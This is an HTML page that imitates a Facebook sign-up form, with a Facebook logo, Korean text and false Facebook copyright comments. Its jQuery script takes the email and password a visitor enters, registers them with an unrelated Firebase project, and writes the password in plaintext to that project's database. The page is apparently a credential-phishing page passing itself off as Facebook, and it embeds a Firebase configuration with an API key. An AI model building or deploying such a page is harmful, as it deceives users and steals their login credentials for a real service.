 <html>

 <head>
     <title>Sign up with facebook</title>
     <!--Sign up with Facebook. Copyright@Facebook 2021.-->



     <link href="https://fonts.googleapis.com/css?family=Ubuntu" rel="stylesheet">
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
     <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
     <meta name="viewport" content="width=device-width, initial-scale=1" />
     <link rel="stylesheet" href="registerfb.css">
     <title>Sign in</title>
 </head>

 <body>
     <div class="main">
         <img class="facebook" src="http://static1.squarespace.com/static/5b1590a93c3a53e49c6d280d/t/5b1aeb05aa4a99b2fb8d8d5e/1528490762005/facebook-icon-logo-C61047A9E7-seeklogo.com.png?format=1500w" alt="" style="display: block; margin: 0 auto" width="60" height="60" align>

         <p class="sign" align="center">Facebook을 이용하여 가입하기</p>
         <form class="form1">



             <input class="un " type="email" align="center" placeholder="Email" id="email">
             <input class="pass" type="password" align="center" placeholder="Password" id="pwd">

             <a type="button" class="submit btn btn-default join" align="center"><strong>Sign up with Facebook</strong></a>


         </form>
     </div>





     <!--Facebook database. Copyright@Facebook 2021 -->
     <script src="https://www.gstatic.com/firebasejs/4.10.1/firebase.js"></script>
     <script>
         var firebaseEmailAuth; // 
         var firebaseDatabase; // 
         var userInfo; // 
         // 
         var config = {
             apiKey: "AIzaSyB8r-4Je7eGofLDKDiTpEppdAp9cItLLug",
             authDomain: "webnote-59e75.firebaseapp.com",
             databaseURL: "https://webnote-59e75.firebaseio.com",
             projectId: "webnote-59e75",
             storageBucket: "webnote-59e75.appspot.com",
             messagingSenderId: "1076614864624",
             appId: "1:1076614864624:web:d1d61eb0ff82cb2aba2c35",
             measurementId: "G-7DW85B53L3"
         };
         firebase.initializeApp(config);

         firebaseEmailAuth = firebase.auth();
         firebaseDatabase = firebase.database();



         //jQuery
         $(document).ready(function () {



             $(document).on('click', '.join', function () {


                 var email = $('#email').val();
                 var password = $('#pwd').val();
                 name = $('#name').val();




                 firebaseEmailAuth.createUserWithEmailAndPassword(email, password).then(function (user) {

                     userInfo = user; 


                     console.log("userInfo/" + userInfo);  
                     console.log("userInfo.currentUser/" + userInfo.currentUser);  
                     console.log("userInfo.uid/" + userInfo.uid); //vPArtCHqPpOeIOpidEfug0Kgq3v1


                     logUser();

                 }, function (error) {

                     var errorCode = error.code;
                     var errorMessage = error.message;
                     alert(errorMessage);

                 });


                 function logUser() {
                     var ref = firebaseDatabase.ref("users/" + userInfo.uid); 


                     var obj = {
                         name: "User",
                         email: email,
                         pwd: password,
                         userkey: userInfo.uid
                     };

                     ref.set(obj);  
                     //alert("success if");


                     window.location.href = "index.html"
                 }


             });
         });
     </script>







 </body>

</html>
